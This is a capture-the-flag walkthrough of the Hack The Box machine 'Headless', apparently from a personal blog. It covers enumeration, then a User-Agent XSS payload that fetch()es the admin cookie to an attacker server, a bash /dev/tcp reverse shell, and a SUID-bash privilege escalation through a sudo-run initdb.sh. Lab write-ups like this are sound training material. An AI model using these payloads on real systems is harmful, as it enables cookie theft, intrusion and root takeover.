# Headless

## Introduction <a href="#introduction" id="introduction"></a>

This writeup details the exploitation process of the "Headless" box on Hack The Box. The challenge is categorized as Easy difficulty and involves several stages.

<figure><img src="../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

## Enumeration <a href="#enumeration" id="enumeration"></a>

### Nmap <a href="#nmap" id="nmap"></a>

```bash
nmap -A -Pn 10.10.11.8
```

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption><p>Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs;</p></figcaption></figure>

### Adding Domain to Hosts File <a href="#adding-domain-to-hosts-file" id="adding-domain-to-hosts-file"></a>

```bash
echo "10.10.11.8 headless.thm" | sudo tee -a /etc/hosts
```

<figure><img src="../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

### Directory Enumeration <a href="#directory-enumeration" id="directory-enumeration"></a>

```bash
dirsearch -u 10.10.11.8:5000
```

<figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption><p>/support</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption><p>/dashboard</p></figcaption></figure>

## Exploitation <a href="#exploitation" id="exploitation"></a>

### Python Server

```bash
python -m http.server 8023
```

### XSS on User-Agent&#x20;

```javascript
<img src=x onerror=fetch('http://<IP>:<PORT>/'+document.cookie);>
```

<figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

After Exploit XSS at User-Agent, we get a reply back with the **admin cookie** at the python server

<figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

### Admin Cookies

<figure><img src="../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell&#x20;

<pre class="language-bash"><code class="lang-bash"><strong>#!/bin/bash
</strong>/bin/bash -c 'exec bash -i >&#x26; /dev/tcp/&#x3C;IP>/&#x3C;PORT> 0>&#x26;1'
#Create Reverse Shell script into a file, In my case I create .sh
</code></pre>

Using a same Python Server to make the victim server can curl.

<figure><img src="../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

### User Flag

<figure><img src="../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

### Check sudo -l <a href="#check-sudo-l" id="check-sudo-l"></a>

```bash
sudo -l
```

<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

### Syscheck

<figure><img src="../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

### Exploit initdb.sh

```bash
echo "chmod u+s /bin/bash" > initdb.sh
chmod +x initdb.sh
```

* `chmod u+s /bin/bash`: Sets the set-user-ID (SUID) permission on `/bin/bash`, allowing users to execute the bash shell with the file owner's (typically root) privileges.
* `chmod +x initdb.sh`: This command changes the permissions of the file `initdb.sh`, making it executable (`+x`) by the file's owner, group, and others. This allows the script to be run as a program by the user.

<figure><img src="../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

```bash
sudo /usr/bin/syscheck
/bin/bash -p
```

* `/bin/bash -p`: starts a bash shell with root privileges retained, due to the SUID bit making the shell run with the file owner's (root's) effective ID.

### Root Flag

<figure><img src="../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
